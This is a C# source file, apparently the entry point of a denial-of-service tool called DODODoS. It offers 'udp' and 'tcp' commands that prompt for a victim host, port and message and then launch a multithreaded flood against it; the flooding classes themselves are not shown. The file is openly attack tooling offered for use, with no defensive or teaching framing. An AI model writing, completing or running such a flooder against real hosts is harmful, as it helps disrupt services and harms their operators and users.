using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DODODoS
{
    class Program
    {
        static Dictionary<String, Action> cmd;
        static void Main(string[] args)
        {
            bool exit = true;
            LoadCommands();

            while (exit)
            {
                Console.Write("> ");
                string command = Console.ReadLine().ToLower();
                cmd[command]();
            }
        }
        /// <summary>
        /// Loads the various commands in the dictionary
        /// </summary>
        static void LoadCommands()
        {
            cmd = new Dictionary<string, Action>();
            cmd.Add("udp", new Action(UDP));
            cmd.Add("tcp", new Action(TCP));
            cmd.Add("exit", new Action(Exit));
        }

        static void Exit()
        {
            Environment.Exit(0);
        }

        /// <summary>
        /// Starts a UDP attack
        /// </summary>
        static void UDP()
        {
            DODODoS.UDP victim = new DODODoS.UDP();
            Console.Write("Victim: ");
            string host = Console.ReadLine();
            Console.Write("Port: ");
            int port = Convert.ToInt32(Console.ReadLine());
            Console.Write("Message: ");
            byte[] message = Encoding.ASCII.GetBytes(Console.ReadLine());

            victim.Connect(host, port);
            victim.Attack(message, Environment.ProcessorCount * 2);
        }

        /// <summary>
        /// Starts a TCp attack
        /// </summary>
        static void TCP()
        {
            DODODoS.TCP victim = new DODODoS.TCP();
            Console.Write("Victim: ");
            string host = Console.ReadLine();
            Console.Write("Port: ");
            int port = Convert.ToInt32(Console.ReadLine());
            Console.Write("Message: ");
            byte[] message = Encoding.ASCII.GetBytes(Console.ReadLine());

            victim.Connect(host, port);
            victim.Attack(message, Environment.ProcessorCount * 2);
        }
    }
}
